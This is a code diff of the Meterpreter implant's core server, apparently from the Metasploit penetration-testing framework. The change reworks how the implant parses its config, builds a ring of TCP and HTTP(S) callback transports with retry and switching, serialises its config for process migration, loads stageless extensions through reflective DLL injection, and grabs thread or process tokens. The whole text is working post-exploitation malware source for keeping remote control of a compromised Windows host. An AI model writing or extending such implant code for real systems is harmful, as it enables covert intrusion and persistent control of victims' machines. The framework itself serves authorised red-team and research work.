@@ -12,18 +12,6 @@
 
 extern Command* extensionCommands;
 
-MetsrvConfigData global_config =
-{
-	.transport = L"METERPRETER_TRANSPORT_SSL\x00\x00",
-	.url = L"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00\x00",
-	.ua = L"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy = L"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy_username = L"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy_password = L"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
-	.timeouts.placeholder = "METERP_TIMEOUTS\x00"
-};
-
 // include the Reflectiveloader() function
 #include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
@@ -82,58 +70,208 @@ DWORD server_sessionid()
  * @param remote Pointer to the remote instance.
  * @param fd The socket descriptor passed to metsrv during intialisation.
  */
-VOID load_stageless_extensions(Remote* remote, ULONG_PTR fd)
+VOID load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensions)
 {
-	LPBYTE extensionStart = (LPBYTE)fd + sizeof(DWORD);
-	DWORD size = *((LPDWORD)(extensionStart - sizeof(DWORD)));
-
-	while (size > 0)
+	while (stagelessExtensions->size > 0)
 	{
-		dprintf("[SERVER] Extension located at 0x%p: %u bytes", extensionStart, size);
-		HMODULE hLibrary = LoadLibraryR(extensionStart, size);
-		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", extensionStart, size, hLibrary);
+		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
+		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size);
 		initialise_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
-
-		extensionStart += size + sizeof(DWORD);
-		size = *((LPDWORD)(extensionStart - sizeof(DWORD)));
+		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
 	}
 
 	dprintf("[SERVER] All stageless extensions loaded");
 }
 
-/*!
- * @brief Create a new transport based on the given metsrv configuration.
- * @param config Pointer to the metsrv configuration block.
- * @param stageless Indication of whether the configuration is stageless.
- * @param fd The socket descriptor passed to metsrv during intialisation.
- */
-static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
+static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size)
 {
-	Transport* t = NULL;
-	wchar_t* transport = config->transport + TRANSPORT_ID_OFFSET;
-	wchar_t* url = config->url + (stageless ? 1 : 0);
+	Transport* transport = NULL;
+	dprintf("[TRNS] Transport claims to have URL: %S", transportCommon->url);
+	dprintf("[TRNS] Transport claims to have comms: %d", transportCommon->comms_timeout);
+	dprintf("[TRNS] Transport claims to have retry total: %d", transportCommon->retry_total);
+	dprintf("[TRNS] Transport claims to have retry wait: %d", transportCommon->retry_wait);
 
-	dprintf("[TRANSPORT] Type = %S", transport);
-	dprintf("[TRANSPORT] URL = %S", url);
-
-	if (wcscmp(transport, L"SSL") == 0)
+	if (wcsncmp(transportCommon->url, L"tcp", 3) == 0)
 	{
-		t = transport_create_tcp(url, &config->timeouts.values);
+		if (size)
+		{
+			*size = sizeof(MetsrvTransportTcp);
+		}
+		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon);
 	}
 	else
 	{
-		BOOL ssl = wcscmp(transport, L"HTTPS") == 0;
-		t = transport_create_http(ssl, url, config->ua, config->proxy, config->proxy_username,
-			config->proxy_password, config->ssl_cert_hash, &config->timeouts.values);
+		if (size)
+		{
+			*size = sizeof(MetsrvTransportHttp);
+		}
+		transport = transport_create_http((MetsrvTransportHttp*)transportCommon);
 	}
 
-	dprintf("[TRANSPORT] Comms timeout: %u %08x", t->timeouts.comms, t->timeouts.comms);
-	dprintf("[TRANSPORT] Session timeout: %u %08x", t->timeouts.expiry, t->timeouts.expiry);
-	dprintf("[TRANSPORT] Session expires: %u %08x", t->expiration_end, t->expiration_end);
-	dprintf("[TRANSPORT] Retry total: %u %08x", t->timeouts.retry_total, t->timeouts.retry_total);
-	dprintf("[TRANSPORT] Retry wait: %u %08x", t->timeouts.retry_wait, t->timeouts.retry_wait);
+	if (transport == NULL)
+	{
+		// something went wrong
+		return NULL;
+	}
 
-	return t;
+	// always insert at the tail. The first transport will be the one that kicked everything off
+	if (remote->transport == NULL)
+	{
+		// point to itself, as this is the first transport.
+		transport->next_transport = transport->prev_transport = transport;
+		remote->transport = transport;
+	}
+	else
+	{
+		transport->prev_transport = remote->transport->prev_transport;
+		transport->next_transport = remote->transport;
+
+		remote->transport->prev_transport->next_transport = transport;
+		remote->transport->prev_transport = transport;
+	}
+
+	// share the lock with the transport
+	transport->lock = remote->lock;
+
+	return transport;
+}
+
+static void append_transport(Transport** list, Transport* newTransport)
+{
+	if (*list == NULL)
+	{
+		// point to itself!
+		newTransport->next_transport = newTransport->prev_transport = newTransport;
+		*list = newTransport;
+	}
+	else
+	{
+		// always insert at the tail
+		newTransport->prev_transport = (*list)->prev_transport;
+		newTransport->next_transport = (*list);
+
+		(*list)->prev_transport->next_transport = newTransport;
+		(*list)->prev_transport = newTransport;
+	}
+}
+
+static void remove_transport(Remote* remote, Transport* oldTransport)
+{
+	// if we point to ourself, then we're the last one
+	if (remote->transport->next_transport == oldTransport)
+	{
+		remote->transport = NULL;
+	}
+	else
+	{
+		// if we're removing the current one we need to move the pointer to the
+		// next one in the list.
+		if (remote->transport == oldTransport)
+		{
+			remote->transport = remote->transport->next_transport;
+		}
+
+		oldTransport->prev_transport->next_transport = oldTransport->next_transport;
+		oldTransport->next_transport->prev_transport = oldTransport->prev_transport;
+	}
+
+	oldTransport->transport_destroy(oldTransport);
+}
+
+static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports, LPDWORD parsedSize)
+{
+	DWORD totalSize = 0;
+	MetsrvTransportCommon* current = transports;
+
+	// The first part of the transport is always the URL, if it's NULL, we are done.
+	while (current->url[0] != 0)
+	{
+		DWORD size;
+		if (create_transport(remote, current, &size) != NULL)
+		{
+			dprintf("[TRANS] transport created of size %u", size);
+			totalSize += size;
+
+			// go to the next transport based on the size of the existing one.
+			current = (MetsrvTransportCommon*)((LPBYTE)current + size);
+		}
+		else
+		{
+			// This is not good
+			return FALSE;
+		}
+	}
+
+	// account for the last terminating NULL wchar
+	*parsedSize = totalSize + sizeof(wchar_t);
+
+	return TRUE;
+}
+
+static void config_create(Remote* remote, MetsrvConfig** config, LPDWORD size)
+{
+	// This function is really only used for migration purposes.
+	DWORD s = sizeof(MetsrvSession);
+	MetsrvSession* sess = (MetsrvSession*)malloc(s);
+	ZeroMemory(sess, s);
+
+	dprintf("[CONFIG] preparing the configuration");
+
+	// start by preparing the session.
+	memcpy(sess->uuid, remote->orig_config->session.uuid, sizeof(sess->uuid));
+	sess->expiry = remote->sess_expiry_end - current_unix_timestamp();
+	sess->exit_func = EXITFUNC_THREAD; // migration we default to this.
+
+	Transport* current = remote->transport;
+	Transport* t = remote->transport;
+	do
+	{
+		// extend memory appropriately
+		DWORD neededSize = t->type == METERPRETER_TRANSPORT_SSL ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);
+
+		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_SSL ? "ssl" : "http/s", s);
+
+		sess = (MetsrvSession*)realloc(sess, s + neededSize);
+
+		// load up the transport specifics
+		LPBYTE target = (LPBYTE)sess + s;
+
+		ZeroMemory(target, neededSize);
+		s += neededSize;
+
+		if (t->type == METERPRETER_TRANSPORT_SSL)
+		{
+			transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
+			dprintf("[CONFIG] TCP Comms Timeout: %d", ((MetsrvTransportTcp*)target)->common.comms_timeout);
+			dprintf("[CONFIG] TCP Retry Total: %d", ((MetsrvTransportTcp*)target)->common.retry_total);
+			dprintf("[CONFIG] TCP Retry Wait: %d", ((MetsrvTransportTcp*)target)->common.retry_wait);
+			dprintf("[CONFIG] TCP URL: %S", ((MetsrvTransportTcp*)target)->common.url);
+
+			// if the current transport is TCP, copy the socket fd over so that migration can use it.
+			if (t == current)
+			{
+				sess->comms_fd = (DWORD)t->get_socket(t);
+			}
+		}
+		else
+		{
+			transport_write_http_config(t, (MetsrvTransportHttp*)target);
+		}
+
+		t = t->next_transport;
+	} while (t != current);
+
+	// account for the last terminating NULL wchar so that the target knows the list has reached the end,
+	// as well as the end of the extensions list. We may support wiring up existing extensions later on.
+	DWORD terminatorSize = sizeof(wchar_t) + sizeof(DWORD);
+	sess = (MetsrvSession*)realloc(sess, s + terminatorSize);
+	ZeroMemory((LPBYTE)sess + s, terminatorSize);
+	s += terminatorSize;
+
+	// hand off the data
+	dprintf("[CONFIG] Total of %u bytes located at 0x%p", s, sess);
+	*size = s;
+	*config = (MetsrvConfig*)sess;
 }
 
 /*!
@@ -141,7 +279,7 @@ static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
  * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
  * @return Meterpreter exit code (ignored by the caller).
  */
-DWORD server_setup(SOCKET fd)
+DWORD server_setup(MetsrvConfig* config)
 {
 	THREAD* serverThread = NULL;
 	Remote* remote = NULL;
@@ -149,10 +287,10 @@ DWORD server_setup(SOCKET fd)
 	char desktopName[256] = { 0 };
 	DWORD res = 0;
 
-	// first byte of the URL indites 's' if it's stageless
-	BOOL isStageless = global_config.url[0] == 's';
-
-	dprintf("[SERVER] Initializing...");
+	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
+	dprintf("[SESSION] Comms Fd: %u", config->session.comms_fd);
+	dprintf("[SESSION] UUID: %S", config->session.uuid);
+	dprintf("[SESSION] Expiry: %u", config->session.expiry);
 
 	// if hAppInstance is still == NULL it means that we havent been
 	// reflectivly loaded so we must patch in the hAppInstance value
@@ -178,9 +316,34 @@ DWORD server_setup(SOCKET fd)
 				break;
 			}
 
-			// Set up the transport creation function pointers.
-			remote->trans_create_tcp = transport_create_tcp;
-			remote->trans_create_http = transport_create_http;
+			remote->orig_config = config;
+			remote->sess_expiry_time = config->session.expiry;
+			remote->sess_start_time = current_unix_timestamp();
+			remote->sess_expiry_end = remote->sess_start_time + config->session.expiry;
+
+			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);
+
+			DWORD transportSize = 0;
+			if (!create_transports(remote, config->transports, &transportSize))
+			{
+				// not good, bail out!
+				SetLastError(ERROR_BAD_ARGUMENTS);
+				break;
+			}
+
+			// the first transport should match the transport that we initially connected on.
+			// If it's TCP comms, we need to wire that up.
+			if (remote->transport->type == METERPRETER_TRANSPORT_SSL && config->session.comms_fd)
+			{
+				((TcpTransportContext*)remote->transport->ctx)->fd = (SOCKET)config->session.comms_fd;
+			}
+
+			load_stageless_extensions(remote, (MetsrvExtension*)((LPBYTE)config->transports + transportSize));
+
+			// Set up the transport creation function pointer
+			remote->trans_create = create_transport;
+			// and the config creation pointer
+			remote->config_create = config_create;
 
 			// Store our thread handle
 			remote->server_thread = serverThread->handle;
@@ -189,6 +352,12 @@ DWORD server_setup(SOCKET fd)
 			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
 			{
 				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
+			}
+
+			if (scheduler_initialize(remote) != ERROR_SUCCESS)
+			{
+				SetLastError(ERROR_BAD_ENVIRONMENT);
+				break;
 			}
 
 			// Copy it to the thread token
@@ -207,70 +376,84 @@ DWORD server_setup(SOCKET fd)
 			dprintf("[SERVER] Registering dispatch routines...");
 			register_dispatch_routines();
 
-			if (isStageless)
+			remote->sess_start_time = current_unix_timestamp();
+
+			// loop through the transports, reconnecting each time.
+			while (remote->transport)
 			{
-				// in the case of stageless payloads, fd contains a pointer to the extensions
-				// to load
-				dprintf("[SERVER] Loading stageless extensions");
-				load_stageless_extensions(remote, (ULONG_PTR)fd);
-			}
-
-			// allocate the "next transport" information based off the global configuration
-			dprintf("[SERVER] creating transport");
-			remote->next_transport = transport_create(&global_config, isStageless);
-
-			while (remote->next_transport)
-			{
-				// Work off the next transport
-				remote->transport = remote->next_transport;
-
 				if (remote->transport->transport_init)
 				{
-					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport->transport_init);
+					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport);
 					// Each transport has its own set of retry settings and each should honour
 					// them individually.
-					if (!remote->transport->transport_init(remote, fd))
+					if (!remote->transport->transport_init(remote->transport))
 					{
-						dprintf("[SERVER] transport initialisation failed.");
+						dprintf("[SERVER] transport initialisation failed, moving to the next transport");
+						remote->transport = remote->transport->next_transport;
 
 						// when we have a list of transports, we'll iterate to the next one.
-						break;
+						continue;
 					}
 				}
-
-				// once initialised, we'll clean up the next transport so that we don't try again
-				remote->next_transport = NULL;
 
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
 				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);
 
+				dprintf("[DISPATCH] dispatch exited with result: %u", dispatchResult);
 				if (remote->transport->transport_deinit)
 				{
-					remote->transport->transport_deinit(remote);
+					dprintf("[DISPATCH] deinitialising transport");
+					remote->transport->transport_deinit(remote->transport);
+				}
+
+				dprintf("[TRANS] resetting transport");
+				if (remote->transport->transport_reset)
+				{
+					remote->transport->transport_reset(remote->transport, dispatchResult == ERROR_SUCCESS && remote->next_transport == NULL);
 				}
 
 				// If the transport mechanism failed, then we should loop until we're able to connect back again.
-				// But if it was successful, and this is a valid exit, then we should clean up and leave.
 				if (dispatchResult == ERROR_SUCCESS)
 				{
-					remote->transport->transport_destroy(remote);
+					dprintf("[DISPATCH] Server requested shutdown of dispatch");
+					// But if it was successful, and this is a valid exit, then we should clean up and leave.
+					if (remote->next_transport == NULL)
+					{
+						dprintf("[DISPATCH] No next transport specified, leaving");
+						// we weren't asked to switch transports, so we exit.
+						break;
+					}
+
+					// we need to change transports to the one we've been given. We will assume, for now,
+					// that the transport has been created using the appropriate functions and that it is
+					// part of the transport list.
+					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->next_transport);
+					remote->transport = remote->next_transport;
+					remote->next_transport = NULL;
 				}
 				else
 				{
-					// try again!
-					if (remote->transport->transport_reset)
-					{
-						remote->transport->transport_reset(remote->transport);
-					}
-
-					// when we have a list of transports, we'll iterate to the next one (perhaps?)
-					remote->next_transport = remote->transport;
+					// move to the next one in the list
+					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->transport->next_transport);
+					remote->transport = remote->transport->next_transport;
 				}
+			}
+
+			// clean up the transports
+			while (remote->transport)
+			{
+				remove_transport(remote, remote->transport);
 			}
 
 			dprintf("[SERVER] Deregistering dispatch routines...");
 			deregister_dispatch_routines(remote);
 		} while (0);
+
+		dprintf("[DISPATCH] calling scheduler_destroy...");
+		scheduler_destroy();
+
+		dprintf("[DISPATCH] calling command_join_threads...");
+		command_join_threads();
 
 		remote_deallocate(remote);
 	}
